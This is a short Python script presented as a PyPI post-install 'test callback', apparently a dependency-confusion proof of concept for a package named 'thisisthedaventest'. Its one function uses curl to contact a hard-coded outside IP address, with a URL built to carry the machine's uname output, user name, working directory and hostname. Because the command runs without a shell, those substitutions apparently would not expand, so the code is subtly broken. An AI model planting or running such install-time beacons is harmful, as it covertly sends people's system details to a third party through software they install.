import os
import subprocess

def test_callback():
    print("Running PyPI post-install test callback")
    subprocess.run(["curl", "-fsSL", "http://46.62.163.241:8585/deppoc?datacoming=pypi&package=thisisthedaventest&version=99.99.99&hostdet=$(uname -a | sed -e 's/ /%20/g' -e 's/#//g')&user=$(whoami)&path=$(pwd)&hostname=$(hostname)"])

if __name__ == "__main__":
    test_callback()
